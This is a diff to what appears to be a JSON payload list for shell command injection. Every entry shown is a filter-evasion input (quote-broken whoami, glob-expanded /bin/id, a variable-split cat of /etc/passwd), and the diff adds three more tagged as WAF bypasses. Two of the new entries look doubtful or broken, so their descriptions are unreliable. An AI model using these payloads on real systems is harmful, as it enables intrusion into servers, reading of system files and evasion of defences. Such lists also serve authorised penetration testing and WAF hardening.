@@ -51,7 +51,10 @@
         {"payload": "i$@d", "description": "Empty $@ parameter to break keyword matching", "waf_bypass": true},
         {"payload": "w'h'o'am'i", "description": "Quote-broken whoami to evade string matching", "waf_bypass": true},
         {"payload": "/???/id", "description": "Glob expansion for /bin/id", "waf_bypass": true},
-        {"payload": "c${z}at /etc/passwd", "description": "Null variable to break cat keyword", "waf_bypass": true}
+        {"payload": "c${z}at /etc/passwd", "description": "Null variable to break cat keyword", "waf_bypass": true},
+        {"payload": "${PATH%%u*}ml", "description": "Bash parameter expansion — builds command from PATH variable without blocked chars", "waf_bypass": true},
+        {"payload": "$(tr '[a-z]' '[A-Z]'<<<'id'|tr '[A-Z]' '[a-z]')", "description": "Case conversion via tr to avoid keyword filters", "waf_bypass": true},
+        {"payload": "a]b]c]d]e; id", "description": "Bash brace/bracket confusion — confuse simple WAF regex parsers", "waf_bypass": true}
       ]
     },
     "blind_oob": {
